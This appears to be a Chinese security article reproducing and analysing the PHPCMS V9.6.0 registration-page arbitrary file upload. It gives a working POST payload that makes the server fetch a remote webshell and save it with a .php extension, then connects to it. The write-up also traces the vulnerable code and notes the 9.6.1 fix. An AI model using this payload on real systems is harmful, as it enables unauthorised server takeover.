<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sH0-JfD07AzMzpknqWME1w)

#### **影响范围**

PHPCMS V9.6.0

#### **攻击类型**

任意文件上传

#### **利用条件**

影响范围应用

#### **漏洞概述**

2017 年 4 月份左右 PHPCMS V9.6 被曝出注册页面存在任意文件上传漏洞，通过该漏洞攻击者可以在未授权的情况下上传任意文件，甚至 getshell

#### **漏洞复现**

##### 利用方式 1

首先打开用户注册页面，之后随意填写数据，同时使用 burpsuite 抓取数据包：

```
http://192.168.174.138/phpcms/index.php?m=member&c=index&a=register&siteid=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJfav6lzhRHucRDwm6YrEHT5Es1YHoQd0Z28byREiclhbyQmiaUrUjyoiaw/640?wx_fmt=png)

之后发送到 repeater 模块，同时修改请求数据包中的请求数据为：

```
siteid=1&modelid=11&username=joe&password=123456&email=123qwe@qq.com&info[content]=<img src=http://192.168.174.138/shell.txt?.php#.jpg>&dosubmit=1&protocol=

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ6OHRbVRD9RpMwOtKiaLdhEKp6zzFS8AicnlfWtREgWWSa9SqukgTRA9Q/640?wx_fmt=png)

文件成功上传

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ7c0JOzzutYbTlmtlJCTUktYK60NJPVzeibDs6jwz32R7AP70eaGKibRw/640?wx_fmt=png)

##### 利用方式 2

在 Firefox 中访问用户注册页面，同时通过 hackbar 来 POST 以下请求 (这里的 img 标签中的 src 为可以访问到的 VPS 中的 webshell 木马程序访问地址)：

```
siteid=1&modelid=11&username=Al1ex&password=1234567&email=1234@163.com&info[content]=<img src=http://192.168.174.138/shell.txt?.php#.jpg>&dosubmit=1&protocol=

```

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDPGJvU2N7eQqFGTZJiau7GjQ1kp5QiaRVxvmQ5MS2NyYqtGM2nrqKibNg/640?wx_fmt=png)

之后更具目录去相关目录下查看文件，发现 webshell 确实已经被成功上传：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJciakhHiaehsYwyP25kXKTqjTs4qDzcTibmSWmXWRlvZmyn9lQ068TlMgA/640?wx_fmt=png)

之后使用蚁剑来连接：  

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJtibdejNiavtPyKy45oh04sbuZzCcxGKoOib3tCsjkG9sTkZkbsTnvtkYA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ4t79qEMuQk08R1djbQibm7M5KllurtS4PNDNjerkKKVmUqnIumKEC3Q/640?wx_fmt=png)

#### 漏洞分析

首先我们需要查看一下用户的注册功能 "phpcms/modules/member/index.php" 中的 register 函数：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ4r4OSc2dGic5u5eibiaedfejgib6mMvy7NAKYj6NnHS63SxUjfcN36wUIQ/640?wx_fmt=png)

从上面的流程可以看到首先是获取用户的 siteid，之后定义了站点的 id 并加载了用户模块和短信模块的配置，之后通过对 "$_POST['dosubmit']" 是否为空进行判断来确定是否要进入用户注册流程当中，而我们这里自然是不为空了，所以我们继续跟进。之后通过查看代码我们可以看到对于用户的信息验证代码在 L129 行开始，同时我们之前在漏洞验证过程中的关键词 "info" 也出现了，我们继续跟进：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDDCfQjMLfRunFQRv9D7wug6z4LIVMTd4dW3hXEkbYG0iapdkuS8rh4Q/640?wx_fmt=png)

从上面的代码中我们可以看到对于 post 进的 info 信息首先通过 "new_html_special_chars" 来转义了一下 HTML 特殊字符，之后用将其传入到了 member_input 中，之后我们跟进 get 函数来看看：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJUEFUcUBMqicbV68ibQHdkMSjRWAaUK1c5UsicbfQKBsAQl4u3H9Q4RaXA/640?wx_fmt=png)

从上面可以看到这里首先通过 trim_sript 函数：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJZOk4MsCFJ7zfz3ChnChEiaWxIoWZUuZiarPpxZxNT0VXJMXFXdvato9A/640?wx_fmt=png)

从函数功能来看这里只是对用户的输入的数据中的 javscript 代码进行了一次转义。  

在 get 函数中有个关键的点就是 if(is_array($data))，我们 payload 中的 info 就是个数组，所以能走进这个 if 条件中，继续跟。 先是用 foreach 进行遍历 $info，键名为 $field，键值为 $value，首先用 safe_replace 进行了一次安全替换：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJQKlcu5jgtT3xNBBn34QCId0oOlrJEAOWgcNGZkQrsDjaTIpXBAibB1g/640?wx_fmt=png)

之后我们再次返回到 get 函数中，由于我们的 payload 是 info[content]，所以调用的是 editor 函数，同样在这个文件中：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ7wz5LB9FwQzmHfaDFeY9EgTyzgcBuhfIlu177nABMv3m0PV6Tw3Y0g/640?wx_fmt=png)

接下来函数执行 $this->attachment->download 函数进行下载，我们继续跟进，在 phpcms/libs/classes/attachment.class.php 中：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ9gswvSXPpPIzIoq6JcO6rSBjeQCoVQRboY3yXwsE6s3dBoMXsrhdnQ/640?wx_fmt=png)

函数中先对 $value 中的引号进行了转义，然后使用正则匹配：

```
$ext = 'gif|jpg|jpeg|bmp|png';
...
$string = new_stripslashes($value);
if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i",$string, $matches)) return $value;

```

这里正则要求输入满足 src/href=url.(gif|jpg|jpeg|bmp|png)，我们的 payload （<img src=http://url/shell.txt?.php#.jpg>）符合这一格式（这也就是为什么后面要加. jpg 的原因）。接下来程序使用这行代码来去除 url 中的锚点：$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);，处理过后 $remotefileurls 的内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJDG6vdkNQcbFMibGOaQicAXTdVXVia7gOlWYVd5iaI1M28d9eR8xQBdHXUw/640?wx_fmt=png)

可以看到 #.jpg 会被自动删除了，正因如此，下面的 $filename = fileext($file); 取的的后缀变成了 php，这也就是 PoC 中为什么要加 #的原因: 把前面为了满足正则而构造的. jpg 过滤掉，使程序获得我们真正想要的 php 文件后缀。随后在这一行带入了函数 fillurl：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ6HOqRwjaHF89oQJ5ys4HKjsQTRExEIFhvOp6XqTsBS3uiayWuPafo7Q/640?wx_fmt=png)

同时在 fillurl 中去掉了 #后的内容：

```
$pos = strpos($surl,'#');
        if($pos>0) $surl = substr($surl,0,$pos);

```

随后便进行下载：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJWImhd4Cric6I92RxusTjIqVHks4TUB72orWHrSpAic4ItATV4uZ4fgrA/640?wx_fmt=png)

其中 $upload_func 等同于 php 的 copy 函数。 然而：

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJ2kc4ibHlFtruetSYtuhw0kCicyUKia549RqIoDWEAtmbp9TiaQI2pumicvQ/640?wx_fmt=png)

而 fopen 一般都是可用的，如果开启了 allow_url_fopen，这个漏洞就构成了，然而大部分环境都默认开启了 allow_url_fopen。 

最终在插入注册信息时因为混入了未知的参数而导致插入失败，报错就显示出了这个未知的参数至此，该漏洞分析完成。

#### **漏洞 POC**

**pocsuite3**

POC 完整脚本后台回复 "PHPCMS" 下载

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJfk0kMX8vz1uib26bjSBn2NZmCpe4GSKk9I98kkg25iaBXibicMqYwibIQFA/640?wx_fmt=png)

#### **修复建议**

 phpcms 发布了 9.6.1 版本，针对该漏洞的具体补丁如下, 在获取文件扩展名后再对扩展名进行检测

![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicl97QZCNujeDOjFHtHKReQJLFU5FgFfN4TzGN9lkJrOQ0aeAoJ83taomYne5WrwtRXfLiciaJzzgWNA/640?wx_fmt=png)

#### 参考链接

https://www.seebug.org/vuldb/ssvid-92930